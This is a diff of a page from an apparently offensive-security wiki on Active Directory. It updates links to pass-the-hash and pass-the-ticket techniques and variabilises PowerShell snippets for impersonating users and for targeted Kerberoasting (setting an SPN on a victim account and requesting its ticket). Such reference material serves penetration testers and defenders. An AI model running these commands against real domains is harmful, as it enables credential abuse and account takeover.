@@ -8,9 +8,9 @@ category: ad
 When credentials are found (through [dumping](dumping/index) or [cracking](cracking.md) for instance), attackers try to use them to obtain access to new resources. Depending on the harvested credential material type, the impersonation can be done in different ways.
 
 * LM or NT password hash: [pass-the-hash](../ntlm/pth.md)
-* RC4 Kerberos key (i.e. NT hash): [overpass-the-hash](../kerberos/ptk.md)
-* non-RC4 Kerberos key (i.e. DES or AES): [pass-the-key](../kerberos/ptk.md) (alias for overpass-the-hash)
-* Kerberos ticket: [pass-the-ticket](../kerberos/ptt.md)
+* RC4 Kerberos key (i.e. NT hash): [overpass-the-hash](../kerberos/pass-the/opth.md)
+* non-RC4 Kerberos key (i.e. DES or AES): [pass-the-key](../kerberos/pass-the/ptk.md)
+* Kerberos ticket: [pass-the-ticket](../kerberos/pass-the/ptt.md)
 * plaintext password: the techniques listed below
 
 ::: tabs
@@ -35,8 +35,8 @@ In Powershell, it is possible to impersonate a user by create a credential objec
 $credential = Get-Credential
 
 # Credential object creation (not prompted)
-$password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
-$credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
+$password = ConvertTo-SecureString $PASSWORD -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential("$DOMAIN\$USER", $password)
 
 # Usage
 Start-Process Notepad.exe -Credential $credential
@@ -51,13 +51,13 @@ Here is an example for [targeted Kerberoasting](../dacl/targeted-kerberoasting.m
 
 ```bash
 # Credential object creation (not prompted)
-$password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
-$credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
+$password = ConvertTo-SecureString $PASSWORD -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential("$DOMAIN\$USER", $password)
 
 # Usage
-Set-DomainObject -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' -Identity 'victimuser' -Set @{serviceprincipalname='nonexistant/BLAHBLAH'}
-$User = Get-DomainUser -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' 'victimuser'
-$User | Get-DomainSPNTicket -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' | fl
+Set-DomainObject -Credential $credential -Domain $DOMAIN -Server $DC_HOST -Identity $TARGET_USER -Set @{serviceprincipalname='nonexistant/BLAHBLAH'}
+$User = Get-DomainUser -Credential $credential -Domain $DOMAIN -Server $DC_HOST $TARGET_USER
+$User | Get-DomainSPNTicket -Credential $credential -Domain $DOMAIN -Server $DC_HOST | fl
 ```
 
 :::
